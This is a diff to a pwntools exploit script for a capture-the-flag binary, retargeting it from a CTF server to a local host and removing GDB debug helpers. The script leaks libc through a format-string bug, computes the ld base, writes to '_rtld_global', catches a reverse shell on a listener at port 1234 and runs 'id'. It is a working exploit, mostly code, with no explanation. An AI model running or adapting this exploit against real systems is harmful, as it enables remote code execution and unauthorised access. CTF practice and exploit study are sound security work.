@@ -9,15 +9,6 @@ import time
 import sys
 import signal
 
-salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''
-
-def clear(signum=None, stack=None):
-    print('Strip  all debugging information')
-    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
-    exit(0)
-
-for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
-    signal.signal(sig, clear)
 
 # # Create a symbol file for GDB debugging
 # try:
@@ -36,31 +27,13 @@ for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:
 context.arch = 'amd64'
 # context.arch = 'i386'
 # context.log_level = 'debug'
-execve_file = './secpwn'
+execve_file = '/root/input_elf'
 # sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
-sh = process(execve_file)
-# sh = remote('secpwn.balsnctf.com', 4597 )
+# sh = process(execve_file)
+sh = remote('127.0.0.1', 60005)
 elf = ELF(execve_file)
-libc = ELF('./libc.so.6')
-# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-
-# Create temporary files for GDB debugging
-try:
-    gdbscript = '''
-    b *$rebase(0x1892)
-    b *$rebase(0x160B)
-    b exit
-    '''
-
-    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
-    f.write(str(proc.pidof(sh)[0]))
-    f.close()
-
-    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
-    f.write(gdbscript)
-    f.close()
-except Exception as e:
-    pass
+# libc = ELF('./libc-2.27.so')
+libc = ELF('/root/libc.so')
 
 sh.sendlineafter('>\n', '5')
 sh.sendafter('fmt:\n', '%a#%a#\n')
@@ -71,7 +44,6 @@ log.success('libc_addr: ' + hex(libc_addr))
 ld_addr = libc_addr + 0x1f4000
 log.success('ld_addr: ' + hex(ld_addr))
 
-open('/tmp/gdb_script{}'.replace('{}', salt), 'a').write('\nb *' + hex(ld_addr + 0x10cf0) + '\n')
 
 sh.sendlineafter('>\n', '7')
 sh.sendafter('Addr: ', str(libc_addr + libc.symbols['_rtld_global']))
@@ -160,5 +132,10 @@ server = listen(1234)
 sh.sendline('10')
 reverse_sh = server.wait_for_connection()
 
-reverse_sh.interactive()
-clear()
+sleep(1)
+sh.sendline("id")
+sleep(1)
+print sh.recv(timeout=5)
+sleep(10)
+sh.close
+#sh.interactive()
